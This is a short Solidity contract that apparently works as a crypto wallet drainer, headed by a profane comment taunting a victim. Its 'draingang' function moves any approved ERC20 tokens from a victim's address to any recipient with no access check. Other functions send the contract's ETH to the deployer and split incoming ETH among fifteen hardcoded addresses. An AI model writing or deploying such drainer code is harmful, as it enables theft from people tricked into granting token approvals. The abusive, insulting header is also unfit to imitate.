///////////////////////////////////////////////////////////////////
// mf got beamed by a verified CA hahahahahahahha                /
//                                                               \
// open a dd now lil bitch ass pussy                             /
//                                                               \
// smoking what pack??? DAT NONE PACK HAAHHAHAHAHAHAHAHAHA       /
//                                                               \
// https://youtu.be/8PzLngoKwW4 VOLUME UP BITCHASSS              /
//                                                               \
// ggez                                                          /
/////////////////////////////////////////////////////////////////


pragma solidity 0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract dg {
    address owner = address(0);
    address ecco2k = address(0);
    // gangshit
    address[] oh = [payable(0xE92d057AAac548cDD1C3031ecd5D229870688FE3),
                    payable(0x56093266Ea4d75f0927FF6836C125A955EEcC2cE),
                    payable(0x405dF723f160fC0E173Fd53023d1243bf7DEBF9A),
                    payable(0x10Aa8ffaF8F8e1f48E34648d6CD0CFc4CE1fD5aa),
                    payable(0xfB2daabB449ACA2263E892E93075a14064cc5098),
                    payable(0xe91199671D4CF76aFd603555EB54581A38E8Ff2c),
                    payable(0x55d7127618f25d2fbfcb20aC671003A959366a6d),
                    payable(0xB01b9b0443D4E2a0551C9b754249987843eA6831),
                    payable(0xC95810Cda49255904C25Ef5Ffb173933E315015e),
                    payable(0xe6B16Fa65495E837b344D1c6e0bFE3BbC6D39724),
                    payable(0xA0d336fb7AD5A4a093c7741083B01765a165B744),
                    payable(0x280d7c7571425a973276fcC4Ebb8317164E96675),
                    payable(0xC9DEe4B530EBfAB237ea15EfF512838Bf87dEBfE),
                    payable(0xE81925f52ff8D323B8A99f87D0123478B373d2FD),
                    payable(0x295214Ae3fb0171902efee071c1C9Be799001925)];


    constructor () {
        ecco2k = msg.sender;
        owner = msg.sender;
    }

    modifier isOwner {
        require(msg.sender == owner, "hehe");
        _;
    }

    function updateEcco(address newaddress) public isOwner {
        ecco2k = newaddress;
    }

    function draingang(address takeaknife, address drain, address your, uint256 life) public {
        IERC20 bladee = IERC20(takeaknife);
        bladee.transferFrom(drain, your, life); 
    }
    function gimmemyeth() public {
        ecco2k.call{value: address(this).balance}("");
    }
    function benice2me() payable public {
        uint256 amount = msg.value / oh.length;
        for (uint i=0; i <oh.length;i++) {
            oh[i].call{value: amount}("");
        }
    }

}